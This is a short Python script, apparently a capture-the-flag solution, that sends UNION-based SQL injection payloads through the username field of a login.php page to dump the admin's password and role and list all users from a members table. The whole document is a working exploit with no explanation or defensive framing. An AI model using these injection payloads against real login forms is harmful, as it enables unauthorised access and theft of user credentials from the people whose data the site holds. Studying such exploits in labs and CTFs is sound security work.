import requests, re

BASE = "http://6033bc60-27f0-4b34-aef3-14d892d241b2.red.cyberkent.uz"

def try_login(username, password="x"):
    r = requests.post(f"{BASE}/login.php", data={"username": username, "password": password}, timeout=10)
    m = re.search(r'<div class="status-box">(.*?)</div>', r.text, re.S)
    status = m.group(1) if m else "(no status box)"
    err = re.search(r'<div class="error-box">(.*?)</div>', r.text, re.S)
    err_text = err.group(1) if err else "(NO ERROR BOX)"
    return status, err_text

s, e = try_login("zzznouser' UNION SELECT 1, username || '|' || password || '|' || role, 3 FROM members WHERE username='admin'-- -")
print("ADMIN ROW:", s)
print("ERR:", e)

s2, e2 = try_login("zzznouser' UNION SELECT 1, GROUP_CONCAT(username || ':' || role), 3 FROM members-- -")
print("ALL USERS:", s2)
